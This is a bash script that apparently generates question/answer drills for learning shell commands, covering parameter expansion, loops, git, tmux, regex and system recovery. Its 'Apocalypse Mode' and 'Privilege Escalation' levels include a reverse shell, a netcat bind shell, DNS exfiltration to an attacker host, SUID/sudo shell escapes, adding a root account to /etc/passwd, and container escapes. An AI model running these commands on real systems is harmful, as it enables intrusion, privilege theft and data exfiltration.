  questions+=("Remove extension from ${log} to get basename|echo \${file%.*}")
  questions+=("Diff ${txt%.txt}.old vs ${txt%.txt}.new (using param expansion)|diff ${txt%.txt}.{old,new}")
  questions+=("Strip leading 'v' from version string \$ver (e.g., v1.2.3)|echo \${ver#v}")
  questions+=("Remove protocol from URL \$url (e.g., https://)|echo \${url#*://}")
  questions+=("Get domain from URL \$url (remove path)|echo \${url%%/*}")
  questions+=("Strip all leading directories from \$path|echo \${path##*/}")

  # Parameter expansion - substitution
  questions+=("Replace first 'old' with 'new' in \$var|echo \${var/old/new}")
  questions+=("Replace ALL 'old' with 'new' in \$var|echo \${var//old/new}")
  questions+=("Replace 'old' at START of \$var|echo \${var/#old/new}")
  questions+=("Replace 'old' at END of \$var|echo \${var/%old/new}")
  questions+=("Delete all spaces from \$var|echo \${var// /}")
  questions+=("Delete all digits from \$var|echo \${var//[0-9]/}")

  # Parameter expansion - substrings
  questions+=("Extract substring from position 5|echo \${var:5}")
  questions+=("Extract 3 chars starting at position 5|echo \${var:5:3}")
  questions+=("Get last 4 characters of \$var|echo \${var: -4}")
  questions+=("Get string length of \$var|echo \${#var}")

  # Parameter expansion - case
  questions+=("Convert \$var to lowercase|echo \${var,,}")
  questions+=("Convert \$var to uppercase|echo \${var^^}")
  questions+=("Capitalize first char of \$var|echo \${var^}")
  questions+=("Lowercase first char of \$var|echo \${var,}")

  # Parameter expansion - defaults
  questions+=("Use 'default' if \$var is unset|echo \${var:-default}")
  questions+=("Set \$var to 'default' if unset|echo \${var:=default}")
  questions+=("Error if \$var is unset|echo \${var:?error message}")
  questions+=("Use 'alt' if \$var IS set|echo \${var:+alt}")

  # Indexed arrays
  questions+=("Declare indexed array|declare -a arr")
  questions+=("Create array with values|arr=(one two three)")
  questions+=("Access first element|echo \${arr[0]}")
  questions+=("Access last element|echo \${arr[-1]}")
  questions+=("Get all array elements|echo \${arr[@]}")
  questions+=("Get array length|echo \${#arr[@]}")
  questions+=("Get array indices|echo \${!arr[@]}")
  questions+=("Append to array|arr+=(four)")
  questions+=("Delete array element at index 1|unset 'arr[1]'")
  questions+=("Slice array: elements 1-3|echo \${arr[@]:1:3}")

  # Associative arrays
  questions+=("Declare associative array|declare -A map")
  questions+=("Set associative array value|map[key]=value")
  questions+=("Create associative array inline|declare -A map=([k1]=v1 [k2]=v2)")
  questions+=("Get associative array value|echo \${map[key]}")
  questions+=("Get all keys of associative array|echo \${!map[@]}")
  questions+=("Get all values of associative array|echo \${map[@]}")
  questions+=("Check if key exists in array|[[ -v map[key] ]]")

  # Array operations
  questions+=("Loop over array elements|for x in \"\${arr[@]}\"; do echo \"\$x\"; done")
  questions+=("Loop with index|for i in \"\${!arr[@]}\"; do echo \"\$i: \${arr[\$i]}\"; done")
  questions+=("Join array with comma|IFS=','; echo \"\${arr[*]}\"")
  questions+=("Read file lines into array|mapfile -t arr < ${txt}|readarray -t arr < ${txt}")
  questions+=("Read command output into array|mapfile -t arr < <(ls)")
  questions+=("Copy array|arr2=(\"\${arr[@]}\")")
  questions+=("Merge two arrays|merged=(\"\${arr1[@]}\" \"\${arr2[@]}\")")

  printf '%s\n' "${questions[@]}"
}

# Level 7: Control Flow & Functions
gen_level18() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # if/else
  questions+=("Basic if statement|if [[ condition ]]; then cmd; fi")
  questions+=("if/else statement|if [[ cond ]]; then cmd1; else cmd2; fi")
  questions+=("if/elif/else|if [[ c1 ]]; then cmd1; elif [[ c2 ]]; then cmd2; else cmd3; fi")
  questions+=("Test if file exists and run|[[ -f ${txt} ]] && cat ${txt}")
  questions+=("Test if command succeeds|if grep -q error ${log}; then echo found; fi")
  questions+=("Negate condition|if ! [[ -f ${txt} ]]; then echo missing; fi")
  questions+=("Compound AND condition|if [[ -f ${txt} && -r ${txt} ]]; then cat ${txt}; fi")
  questions+=("Compound OR condition§if [[ -z \"\$var\" || \"\$var\" == \"default\" ]]; then echo empty; fi")

  # for loops (practical examples)
  questions+=("Process all .${ext} files in current dir|for f in *.${ext}; do echo \"Processing \$f\"; done")
  questions+=("Rename all .txt to .bak|for f in *.txt; do mv \"\$f\" \"\${f%.txt}.bak\"; done")
  questions+=("Retry curl until success (max ${n} tries)|for i in {1..${n}}; do curl -s url && break; sleep 1; done")
  questions+=("Loop over servers and check SSH|for h in srv1 srv2 srv3; do ssh -o ConnectTimeout=2 \$h uptime; done")
  questions+=("Process numbered files file1 to file${n}|for i in {1..${n}}; do cat file\$i; done")
  questions+=("C-style countdown from ${n}|for ((i=${n}; i>0; i--)); do echo \$i; done")
  questions+=("Loop over array elements|for item in \"\${arr[@]}\"; do echo \"\$item\"; done")
  questions+=("Loop over files in ${dir}/, skip dirs|for f in ${dir}/*; do [[ -f \"\$f\" ]] && echo \"\$f\"; done")

  # while loops
  questions+=("While loop basic|while [[ condition ]]; do cmd; done")
  questions+=("While read lines from file|while IFS= read -r line; do echo \"\$line\"; done < ${txt}")
  questions+=("While with counter|i=0; while ((i < ${n})); do echo \$i; ((i++)); done")
  questions+=("Infinite loop with break|while true; do cmd; [[ cond ]] && break; done")
  questions+=("While with continue|while read -r line; do [[ -z \"\$line\" ]] && continue; echo \"\$line\"; done < ${txt}")
  questions+=("Read command output line by line|while IFS= read -r line; do echo \"\$line\"; done < <(ls -la)")
  questions+=("Until loop (opposite of while)|until [[ -f ${txt} ]]; do sleep 1; done")

  # case statements
  questions+=("Basic case statement|case \"\$var\" in a) echo A;; b) echo B;; *) echo other;; esac")
  questions+=("Case with multiple patterns|case \"\$ext\" in sh|bash) echo shell;; py) echo python;; *) echo other;; esac")
  questions+=("Case for yes/no input|case \"\$ans\" in [Yy]*) echo yes;; [Nn]*) echo no;; *) echo invalid;; esac")
  questions+=("Case with glob patterns|case \"\$file\" in *.txt) echo text;; *.sh) echo script;; esac")

  # functions
  questions+=("Define simple function|func() { echo hello; }")
  questions+=("Function with local variable|func() { local x=5; echo \$x; }")
  questions+=("Function with arguments|func() { echo \"arg1: \$1, arg2: \$2\"; }")
  questions+=("Function with return value|func() { return 0; }; func && echo success")
  questions+=("Function returning string via stdout|func() { echo result; }; var=\$(func)")
  questions+=("Function with all args|func() { echo \"all args: \$@\"; }")
  questions+=("Function with arg count|func() { echo \"got \$# args\"; }")
  questions+=("Check function exists|type -t func &>/dev/null && echo exists")
  questions+=("Unset function|unset -f func")

  # trap and signals
  questions+=("Trap SIGINT (Ctrl+C)|trap 'echo caught' SIGINT")
  questions+=("Trap EXIT for cleanup|trap 'rm -f /tmp/lock' EXIT")
  questions+=("Trap multiple signals|trap 'cleanup' SIGINT SIGTERM EXIT")
  questions+=("Trap ERR for error handling|trap 'echo error at line \$LINENO' ERR")

  # error handling
  questions+=("Exit on any error|set -e")
  questions+=("Exit on undefined variable|set -u")
  questions+=("Fail on pipe error|set -o pipefail")
  questions+=("Strict mode combo|set -euo pipefail")
  questions+=("Check last command status|\$? -ne 0 && echo failed")
  questions+=("Run command, ignore failure§cmd || true")
  questions+=("Die function|die() { echo \"\$1\" >&2; exit 1; }")

  # debugging
  questions+=("Enable debug mode (print commands)|set -x")
  questions+=("Disable debug mode|set +x")
  questions+=("Dry run (print, don't execute)|set -n")

  printf '%s\n' "${questions[@]}"
}

# Level 17: Apocalypse Mode - Hardcore one-liners, recovery, survival
gen_level28() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # === EMERGENCY RECOVERY ===
  questions+=("Remount root filesystem read-write|mount -o remount,rw /")
  questions+=("Emergency single-user mode|init 1|systemctl rescue")
  questions+=("Chroot into system mounted at /mnt|chroot /mnt /bin/bash")
  questions+=("Regenerate initramfs (Arch)|mkinitcpio -P")
  questions+=("Regenerate GRUB config|grub-mkconfig -o /boot/grub/grub.cfg")
  questions+=("Fix broken sudo (as root)|chmod 4755 /usr/bin/sudo; chown root:root /usr/bin/sudo")
  questions+=("Reset root password from recovery|passwd root")
  questions+=("Reinstall bootloader to MBR|grub-install /dev/sda")
  questions+=("Check and repair filesystem|fsck -y /dev/sda1")
  questions+=("Mount LUKS encrypted partition|cryptsetup open /dev/sda2 cryptroot && mount /dev/mapper/cryptroot /mnt")

  # === HARDCORE ONE-LINERS ===
  questions+=("Find and kill process using port ${port}|kill \$(lsof -t -i:${port})|fuser -k ${port}/tcp")
  questions+=("Find large files (>100M) modified in 24h|find / -type f -size +100M -mtime -1 2>/dev/null")
  questions+=("Watch for new connections in realtime|watch -n1 'ss -tn state established'")
  questions+=("Monitor file changes in directory|inotifywait -m -r ${dir}/")
  questions+=("Parallel compress all logs§find /var/log -name '*.log' | parallel gzip")
  questions+=("Find duplicate files by hash§find . -type f -exec md5sum {} + | sort | uniq -d -w32")
  questions+=("Extract all IPs from logs, count, sort§grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head")
  questions+=("Find SUID binaries|find / -perm -4000 -type f 2>/dev/null")
  questions+=("Find world-writable files|find / -perm -o+w -type f 2>/dev/null")
  questions+=("List all open ports and processes§ss -tlpn | awk 'NR>1 {print \$4, \$6}'")

  # === NETWORK SURVIVAL ===
  questions+=("Quick port scan without nmap|for p in {1..1000}; do timeout 0.1 bash -c \"echo >/dev/tcp/${ip}/\$p\" 2>/dev/null && echo \$p; done")
  questions+=("Download file with pure bash (no curl/wget)|exec 3<>/dev/tcp/example.com/80; echo -e 'GET /file HTTP/1.0\\r\\n\\r\\n' >&3; cat <&3")
  questions+=("Simple HTTP server (Python)|python3 -m http.server ${port}")
  questions+=("Reverse shell (bash)|bash -i >& /dev/tcp/${ip}/${port} 0>&1")
  questions+=("Create SSH tunnel and background|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}")
  questions+=("Test if host is up (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up")
  questions+=("Exfil file via DNS (base64)§cat ${txt} | base64 | xargs -I{} dig {}.exfil.attacker.com")
  questions+=("Bind shell with netcat|nc -lvnp ${port} -e /bin/bash")
  questions+=("Encrypted netcat with openssl|openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}")
  questions+=("Pivot through host (proxychains setup)|ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}")

  # === SYSTEM FORENSICS ===
  questions+=("List all cron jobs system-wide|for u in \$(cut -f1 -d: /etc/passwd); do crontab -l -u \$u 2>/dev/null; done; cat /etc/crontab; ls /etc/cron.*")
  questions+=("Find files modified in last hour|find / -mmin -60 -type f 2>/dev/null")
  questions+=("List all users with shell access§grep -v '/nologin\\|/false' /etc/passwd")
  questions+=("Show failed login attempts§journalctl _COMM=sshd | grep -i 'failed\\|invalid'§grep 'Failed' /var/log/auth.log")
  questions+=("Find hidden files in home dirs|find /home -name '.*' -type f 2>/dev/null")
  questions+=("Check for rootkits|chkrootkit|rkhunter --check")
  questions+=("Dump all environment variables|env; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'")
  questions+=("Show all listening processes with full path§ss -tlpn | awk 'NR>1 {print \$6}' | sed 's/.*:\\([0-9]*\\).*/\\1/' | xargs -I{} lsof -i:{}")
  questions+=("Find processes with deleted binaries|ls -la /proc/*/exe 2>/dev/null | grep deleted")
  questions+=("Memory dump of process|gcore -o dump \$(pgrep -f process)")

  # === DEFENSIVE HARDENING ===
  questions+=("Block IP with iptables|iptables -A INPUT -s ${ip} -j DROP")
  questions+=("Block IP with nftables|nft add rule inet filter input ip saddr ${ip} drop")
  questions+=("Rate limit SSH connections|iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT")
  questions+=("Enable SYN cookies|echo 1 > /proc/sys/net/ipv4/tcp_syncookies")
  questions+=("Disable IP forwarding|echo 0 > /proc/sys/net/ipv4/ip_forward")
  questions+=("Flush all firewall rules|iptables -F; iptables -X")
  questions+=("List all iptables rules|iptables -L -n -v")
  questions+=("List all nftables rules|nft list ruleset")
  questions+=("Audit failed sudo attempts|grep 'FAILED' /var/log/auth.log")
  questions+=("Lock user account§passwd -l ${user}§usermod -L ${user}")

  # === PROCESS NINJA ===
  questions+=("List processes by memory usage§ps aux --sort=-%mem | head")
  questions+=("Find process by open file§lsof ${txt}§fuser ${txt}")
  questions+=("Trace system calls of process|strace -p \$(pgrep -f process)")
  questions+=("Kill all processes by name|pkill -9 -f pattern")
  questions+=("Nice a running process|renice -n 10 -p PID")

  # === DISK SURVIVAL ===
  questions+=("Find disk usage hogs§du -xh / 2>/dev/null | sort -rh | head -20")
  questions+=("Clear systemd journal logs|journalctl --vacuum-size=100M")
  questions+=("Sync and drop caches|sync; echo 3 > /proc/sys/vm/drop_caches")
  questions+=("Check disk health (SMART)|smartctl -a /dev/sda")
  questions+=("Secure wipe file|shred -vfz -n 3 ${txt}")
  questions+=("Create RAM disk|mount -t tmpfs -o size=512M tmpfs /mnt/ramdisk")
  questions+=("Clone disk with progress|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync")

  # === PURE BASH MAGIC ===
  questions+=("Random string generator|tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 32")
  questions+=("Timestamp in epoch|date +%s")
  questions+=("Convert epoch to date|date -d @1234567890")
  questions+=("Parallel execution with xargs|cat urls.txt | xargs -P 10 -I{} curl -s {}")
  questions+=("Timeout a command|timeout 5 long_running_cmd")
  questions+=("Retry command until success|until cmd; do sleep 1; done")
  questions+=("Lock file to prevent concurrent runs§exec 200>/tmp/lock; flock -n 200 || exit 1")
  questions+=("Named pipe (FIFO)|mkfifo /tmp/pipe; cmd1 > /tmp/pipe & cmd2 < /tmp/pipe")

  # === OFFLINE/AIR-GAPPED ===
  questions+=("Create bootable USB|dd if=arch.iso of=/dev/sdb bs=4M status=progress oflag=sync")
  questions+=("Generate SSH key (no network needed)|ssh-keygen -t ed25519 -f ~/.ssh/offline_key")
  questions+=("Encrypt file for offline transport|gpg -c --cipher-algo AES256 ${txt}")

  printf '%s\n' "${questions[@]}"
}

# Level 10: Git Operations
gen_level21() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local remote=$(_pick REMOTE_HOSTS)

  # Basics
  questions+=("Initialize new git repo|git init")
  questions+=("Clone repo from URL|git clone https://github.com/user/repo.git")
  questions+=("Clone repo to specific dir|git clone https://github.com/user/repo.git mydir")
  questions+=("Check repo status|git status")
  questions+=("Show current branch|git branch --show-current|git rev-parse --abbrev-ref HEAD")

  # Staging & committing
  questions+=("Stage file '${txt}' for commit|git add ${txt}")
  questions+=("Stage all changed files|git add -u")
  questions+=("Stage all files including untracked|git add -A|git add --all")
  questions+=("Stage interactively (hunks)|git add -p|git add --patch")
  questions+=("Commit with message|git commit -m \"message\"")
  questions+=("Commit all tracked changes|git commit -am \"message\"|git commit -a -m \"message\"")
  questions+=("Amend last commit message|git commit --amend -m \"new message\"")
  questions+=("Amend last commit (add files)|git commit --amend --no-edit")

  # Branches
  questions+=("List all branches|git branch -a|git branch --all")
  questions+=("Create new branch '${branch}'|git branch ${branch}")
  questions+=("Switch to branch '${branch}'|git checkout ${branch}|git switch ${branch}")
  questions+=("Create and switch to new branch '${branch}'|git checkout -b ${branch}|git switch -c ${branch}")
  questions+=("Delete local branch '${branch}'|git branch -d ${branch}")
  questions+=("Force delete local branch '${branch}'|git branch -D ${branch}")
  questions+=("Delete remote branch '${branch}'|git push origin --delete ${branch}")
  questions+=("Rename current branch|git branch -m newname")

  # Remote operations
  questions+=("Add remote origin|git remote add origin https://github.com/user/repo.git")
  questions+=("List remotes|git remote -v")
  questions+=("Fetch from remote|git fetch origin")
  questions+=("Pull branch '${branch}' from remote|git pull origin ${branch}")
  questions+=("Push branch '${branch}' to remote|git push origin ${branch}")
  questions+=("Push and set upstream|git push -u origin ${branch}|git push --set-upstream origin ${branch}")
  questions+=("Force push (dangerous)|git push --force origin ${branch}|git push -f origin ${branch}")

  # History & diff
  questions+=("Show commit log|git log")
  questions+=("Show log one line per commit|git log --oneline")
  questions+=("Show log with graph|git log --oneline --graph --all")
  questions+=("Show last ${n} commits|git log -${n}|git log -n ${n}")
  questions+=("Show diff of unstaged changes|git diff")
  questions+=("Show diff of staged changes|git diff --staged|git diff --cached")
  questions+=("Show diff between branches|git diff main..${branch}|git diff main ${branch}")
  questions+=("Show who changed each line|git blame ${txt}")
  questions+=("Search commits for string|git log -S \"searchterm\"")
  questions+=("Show file at specific commit|git show HEAD~${n}:${txt}")

  # Undoing
  questions+=("Unstage file '${txt}'|git reset HEAD ${txt}|git restore --staged ${txt}")
  questions+=("Discard changes to file '${txt}'|git checkout -- ${txt}|git restore ${txt}")
  questions+=("Reset to last commit (keep changes)|git reset --soft HEAD~1")
  questions+=("Reset to last commit (discard changes)|git reset --hard HEAD~1")
  questions+=("Revert a commit (new commit)|git revert HEAD")
  questions+=("Stash changes|git stash")
  questions+=("Stash with message|git stash push -m \"message\"")
  questions+=("Apply latest stash|git stash pop")
  questions+=("List stashes|git stash list")
  questions+=("Apply specific stash|git stash apply stash@{${n}}")

  # Merging & rebasing
  questions+=("Merge branch '${branch}' into current|git merge ${branch}")
  questions+=("Rebase current onto main|git rebase main")
  questions+=("Continue rebase after conflict|git rebase --continue")
  questions+=("Abort rebase|git rebase --abort")
  questions+=("Cherry-pick commit|git cherry-pick abc123")
  questions+=("Squash last ${n} commits|git rebase -i HEAD~${n}")

  # Tags
  questions+=("List tags|git tag")
  questions+=("Create lightweight tag|git tag v1.0.0")
  questions+=("Create annotated tag|git tag -a v1.0.0 -m \"Release 1.0\"")
  questions+=("Push tags to remote|git push --tags")
  questions+=("Delete tag|git tag -d v1.0.0")

  # Config
  questions+=("Set user name globally|git config --global user.name \"Name\"")
  questions+=("Set user email globally|git config --global user.email \"email@example.com\"")
  questions+=("List all config|git config --list")
  questions+=("Set default branch name|git config --global init.defaultBranch main")

  # Advanced
  questions+=("Find commit that introduced bug|git bisect start; git bisect bad; git bisect good abc123")
  questions+=("Clean untracked files (dry run)|git clean -n")
  questions+=("Clean untracked files|git clean -f")
  questions+=("Clean untracked files and dirs|git clean -fd")
  questions+=("Show reflog|git reflog")
  questions+=("Recover deleted branch from reflog|git checkout -b recovered abc123")

  printf '%s\n' "${questions[@]}"
}

# Level 2: tmux & Screen
gen_level13() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # Session management
  questions+=("Start new tmux session|tmux|tmux new")
  questions+=("Start tmux session named 'mysession'|tmux new -s mysession|tmux new-session -s mysession")
  questions+=("List sessions|tmux ls|tmux list-sessions")
  questions+=("Attach to session|tmux attach|tmux a")
  questions+=("Attach to tmux session 'mysession'|tmux attach -t mysession|tmux a -t mysession")
  questions+=("Detach from session|Ctrl+b d")
  questions+=("Kill tmux session 'mysession'|tmux kill-session -t mysession")
  questions+=("Kill all sessions|tmux kill-server")
  questions+=("Rename session|Ctrl+b \$|tmux rename-session newname")
  questions+=("Switch sessions|Ctrl+b s")
  questions+=("Create new session from within tmux|Ctrl+b :new")

  # Windows (tabs)
  questions+=("Create new window|Ctrl+b c")
  questions+=("Next window|Ctrl+b n")
  questions+=("Previous window|Ctrl+b p")
  questions+=("Switch to window ${n}|Ctrl+b ${n}")
  questions+=("Rename current window|Ctrl+b ,")
  questions+=("List windows|Ctrl+b w")
  questions+=("Close current window|Ctrl+b &")
  questions+=("Find window|Ctrl+b f")
  questions+=("Move window|Ctrl+b .")

  # Panes (splits)
  questions+=("Split pane horizontally|Ctrl+b %")
  questions+=("Split pane vertically|Ctrl+b \"")
  questions+=("Switch to next pane|Ctrl+b o")
  questions+=("Switch pane by direction|Ctrl+b arrow")
  questions+=("Toggle pane zoom|Ctrl+b z")
  questions+=("Close current pane|Ctrl+b x")
  questions+=("Resize pane|Ctrl+b Ctrl+arrow")
  questions+=("Show pane numbers|Ctrl+b q")
  questions+=("Switch to pane by number|Ctrl+b q ${n}")
  questions+=("Convert pane to window|Ctrl+b !")
  questions+=("Rotate panes|Ctrl+b Ctrl+o")
  questions+=("Swap panes|Ctrl+b {|Ctrl+b }")
  questions+=("Even horizontal layout|Ctrl+b Alt+1")
  questions+=("Even vertical layout|Ctrl+b Alt+2")
  questions+=("Tiled layout|Ctrl+b Alt+5")

  # Copy mode
  questions+=("Enter copy mode|Ctrl+b [")
  questions+=("Exit copy mode|q")
  questions+=("Start selection in copy mode|Space")
  questions+=("Copy selection|Enter")
  questions+=("Paste buffer|Ctrl+b ]")
  questions+=("List buffers|Ctrl+b #")
  questions+=("Search forward in copy mode|/")
  questions+=("Search backward in copy mode|?")

  # Misc
  questions+=("Show time|Ctrl+b t")
  questions+=("Show key bindings|Ctrl+b ?")
  questions+=("Enter command mode|Ctrl+b :")
  questions+=("Reload config|tmux source-file ~/.tmux.conf")
  questions+=("Send prefix to nested tmux|Ctrl+b Ctrl+b")

  # CLI commands
  questions+=("Send keys to session|tmux send-keys -t mysession 'ls -la' Enter")
  questions+=("Capture pane output|tmux capture-pane -t mysession -p")
  questions+=("Save pane to file|tmux capture-pane -t mysession -p > output.txt")
  questions+=("Set option|tmux set -g mouse on")
  questions+=("List options|tmux show-options -g")

  # Screen (alternative)
  questions+=("Start screen session|screen")
  questions+=("Start screen session named 'mysession'|screen -S mysession")
  questions+=("List screen sessions|screen -ls")
  questions+=("Attach to screen|screen -r|screen -r mysession")
  questions+=("Detach from screen|Ctrl+a d")
  questions+=("New window in screen|Ctrl+a c")
  questions+=("Next window in screen|Ctrl+a n")
  questions+=("Split horizontally in screen|Ctrl+a S")
  questions+=("Split vertically in screen|Ctrl+a |")
  questions+=("Switch region in screen|Ctrl+a Tab")
  questions+=("Kill screen session 'mysession'|screen -X -S mysession quit")

  printf '%s\n' "${questions[@]}"
}

# Level 16: Privilege Escalation
gen_level27() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # SUID/SGID enumeration
  questions+=("Find all SUID binaries|find / -perm -4000 -type f 2>/dev/null")
  questions+=("Find all SGID binaries|find / -perm -2000 -type f 2>/dev/null")
  questions+=("Find SUID/SGID combined|find / -perm /6000 -type f 2>/dev/null")
  questions+=("Find SUID owned by root|find / -user root -perm -4000 -type f 2>/dev/null")
  questions+=("Find world-writable files|find / -perm -o+w -type f 2>/dev/null")
  questions+=("Find world-writable dirs|find / -perm -o+w -type d 2>/dev/null")
  questions+=("Find files with capabilities|getcap -r / 2>/dev/null")
  questions+=("Find writable files in PATH|find \$(echo \$PATH | tr ':' ' ') -writable 2>/dev/null")

  # User enumeration
  questions+=("Show current user|whoami|id")
  questions+=("Show user groups|groups|id -Gn")
  questions+=("Show all users|cat /etc/passwd|getent passwd")
  questions+=("Show users with shells§grep -v '/nologin\\|/false' /etc/passwd")
  questions+=("Show sudoers rules|sudo -l")
  questions+=("Check sudo version (CVE check)|sudo --version")
  questions+=("Show logged in users|who|w")
  questions+=("Show last logins|last")
  questions+=("Check if user in docker group|id | grep docker")
  questions+=("Check if user in lxd group|id | grep lxd")

  # System enumeration
  questions+=("Show OS version|cat /etc/os-release|uname -a")
  questions+=("Show kernel version|uname -r")
  questions+=("Show running processes|ps aux")
  questions+=("Show processes as tree|ps auxf|pstree")
  questions+=("Show network connections|ss -tlpn|netstat -tlpn")
  questions+=("Show cron jobs for all users|cat /etc/crontab; ls -la /etc/cron.*")
  questions+=("Show user crontab|crontab -l")
  questions+=("Show systemd timers|systemctl list-timers")
  questions+=("Show mounted filesystems|mount|df -h")
  questions+=("Show /etc/fstab|cat /etc/fstab")

  # Config file hunting
  questions+=("Find config files with passwords|grep -ri 'password' /etc/ 2>/dev/null")
  questions+=("Check .bash_history|cat ~/.bash_history")
  questions+=("Find SSH keys|find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null")
  questions+=("Check environment variables|env|printenv")
  questions+=("Find files modified recently|find / -mmin -10 -type f 2>/dev/null")
  questions+=("Search for credentials in files§grep -rli 'password\\|secret\\|key' /home 2>/dev/null")

  # GTFOBins-style exploits
  questions+=("SUID find shell escape|find . -exec /bin/sh -p \\; -quit")
  questions+=("SUID vim shell escape|vim -c ':!/bin/sh'")
  questions+=("SUID less shell escape|less /etc/passwd then !sh")
  questions+=("SUID nmap interactive shell|nmap --interactive then !sh")
  questions+=("SUID python shell|python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'")
  questions+=("SUID perl shell|perl -e 'exec \"/bin/sh\";'")
  questions+=("SUID awk shell|awk 'BEGIN {system(\"/bin/sh\")}'")
  questions+=("Sudo tar privesc|sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh")
  questions+=("Sudo zip privesc|sudo zip /tmp/x.zip /etc/passwd -T --unzip-command='sh -c /bin/sh'")
  questions+=("Sudo git privesc|sudo git -p help config then !/bin/sh")
  questions+=("Sudo env privesc|sudo env /bin/sh")
  questions+=("Capabilities python|python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")

  # Kernel exploits prep
  questions+=("Download and compile exploit|wget https://exploit.com/exp.c && gcc exp.c -o exp && ./exp")
  questions+=("Check kernel exploits (searchsploit)|searchsploit linux kernel \$(uname -r)")
  questions+=("Transfer exploit via base64|base64 exp | nc ${ip} ${port}")
  questions+=("Receive and decode|nc -lvnp ${port} | base64 -d > exp && chmod +x exp")

  # Docker/LXD escape
  questions+=("Docker socket check|ls -la /var/run/docker.sock")
  questions+=("Docker escape via socket|docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
  questions+=("LXD privilege escalation|lxc init ubuntu:18.04 privesc -c security.privileged=true")

  # Weak permissions
  questions+=("Check /etc/passwd writeable|ls -la /etc/passwd")
  questions+=("Check /etc/shadow readable|ls -la /etc/shadow")
  questions+=("Add user to /etc/passwd|echo 'hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd")
  questions+=("Check writable /etc/sudoers|ls -la /etc/sudoers")

  # Path hijacking
  questions+=("Check current PATH|echo \$PATH")
  questions+=("Prepend current dir to PATH|export PATH=.:$PATH")
  questions+=("Create malicious binary|echo '/bin/bash' > /tmp/ls && chmod +x /tmp/ls")
  questions+=("Exploit relative path in SUID|export PATH=/tmp:\$PATH && ./vulnerable_suid")

  # NFS
  questions+=("Check NFS exports|showmount -e ${ip}|cat /etc/exports")
  questions+=("Mount NFS with no_root_squash|mount -t nfs ${ip}:/share /mnt")
  questions+=("Create SUID on NFS|cp /bin/bash /mnt && chmod +s /mnt/bash")

  printf '%s\n' "${questions[@]}"
}

# Level 8: Advanced Regex & Text Processing
gen_level20() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # Regex lookahead/lookbehind (grep -P for PCRE)
  questions+=("Match 'error' followed by number|grep -P 'error(?=\\d)' ${log}")
  questions+=("Match 'error' NOT followed by number|grep -P 'error(?!\\d)' ${log}")
  questions+=("Match number preceded by '$'|grep -P '(?<=\\$)\\d+' ${log}")
  questions+=("Match number NOT preceded by '$'|grep -P '(?<!\\$)\\d+' ${log}")

  # Non-greedy matching
  questions+=("Non-greedy match between quotes|grep -oP '\".*?\"' ${log}")
  questions+=("Match shortest HTML tag|grep -oP '<.*?>' ${txt}")
  questions+=("Extract first word after colon|grep -oP ':\\s*\\K\\S+' ${log}")

  # Word boundaries and anchors
  questions+=("Match whole word 'error' only|grep -w 'error' ${log}|grep '\\berror\\b' ${log}")
  questions+=("Match 'error' at word boundary|grep -P '\\berror' ${log}")
  questions+=("Match lines starting with digit|grep '^[0-9]' ${txt}")
  questions+=("Match lines ending with digit|grep '[0-9]$' ${txt}")
  questions+=("Match empty lines|grep '^$' ${txt}")

  # Character classes
  questions+=("Match any vowel|grep '[aeiou]' ${txt}")
  questions+=("Match non-digit|grep '[^0-9]' ${txt}")
  questions+=("Match word character|grep '\\w' ${txt}")
  questions+=("Match whitespace|grep '\\s' ${txt}")
  questions+=("Match hex character|grep '[0-9a-fA-F]' ${txt}")

  # Quantifiers
  questions+=("Match exactly ${n} digits|grep -E '[0-9]{${n}}' ${log}")
  questions+=("Match ${n} or more digits|grep -E '[0-9]{${n},}' ${log}")
  questions+=("Match 2 to ${n} digits|grep -E '[0-9]{2,${n}}' ${log}")
  questions+=("Match optional 's' (plurals)|grep -E 'errors?' ${log}")

  # Groups and backreferences
  questions+=("Match repeated word|grep -P '\\b(\\w+)\\s+\\1\\b' ${txt}")
  questions+=("Match repeated character|grep -E '(.)\\1' ${txt}")
  questions+=("Capture and replace with sed|sed -E 's/(error):\\s*(.*)/\\2 [\\1]/' ${log}")
  questions+=("Swap two words|sed -E 's/(\\w+)\\s+(\\w+)/\\2 \\1/' ${txt}")

  # Advanced sed
  questions+=("Delete lines matching pattern|sed '/pattern/d' ${txt}")
  questions+=("Print only lines matching|sed -n '/pattern/p' ${txt}")
